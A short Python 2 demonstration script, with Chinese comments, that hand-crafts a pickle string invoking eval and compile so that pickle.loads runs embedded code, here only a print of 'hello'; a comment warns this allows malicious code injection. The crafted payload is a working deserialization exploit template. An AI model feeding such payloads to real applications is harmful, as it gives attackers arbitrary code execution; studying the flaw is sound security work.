#coding:utf8
#只适用于python2

import pickle

sourcecode="""
print("hello")
"""

#精心构造一个字符串
pstr="c__builtin__\neval\n(c__builtin__\ncompile\n(%sS'<payload>'\nS'exec'\ntRtR." % (pickle.dumps( sourcecode )[:-4],)


#序列化时会导致执行python代码  这会导致他人利用进行恶意代码注入
pickle.loads(pstr)


